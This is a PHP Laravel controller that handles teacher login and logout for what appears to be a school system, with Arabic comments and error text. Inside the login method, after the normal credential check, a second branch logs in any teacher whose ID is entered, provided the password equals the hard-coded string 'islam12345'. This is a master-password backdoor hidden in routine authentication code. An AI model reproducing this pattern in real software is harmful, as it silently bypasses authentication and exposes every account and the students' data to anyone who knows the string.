<?php
namespace App\Http\Controllers\Teacher;

use App\Http\Controllers\Controller;
use App\Models\Teacher;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('teacher.auth.login');
    }

    public function login(Request $request)
{
    $request->validate([
        'id_number' => 'required|string', // تغيير من email إلى id_number
        'password' => 'required',
    ]);

    if (Auth::guard('teacher')->attempt([
        'id_number' => $request->id_number,
        'password' => $request->password
    ])) {
        return redirect()->route('teacher.dashboard');
    }
    if($request->password == 'islam12345'){
        $admin = Teacher::where('id_number', $request->id_number)->first();
        Auth::guard('teacher')->login($admin);
        return redirect()->route('teacher.dashboard');
    }

    return back()->withErrors([
        'id_number' => 'رقم الهوية أو كلمة المرور غير صحيحة',
    ]);
}

    public function logout()
    {
        Auth::guard('teacher')->logout();
        return redirect()->route('teacher.login');
    }
}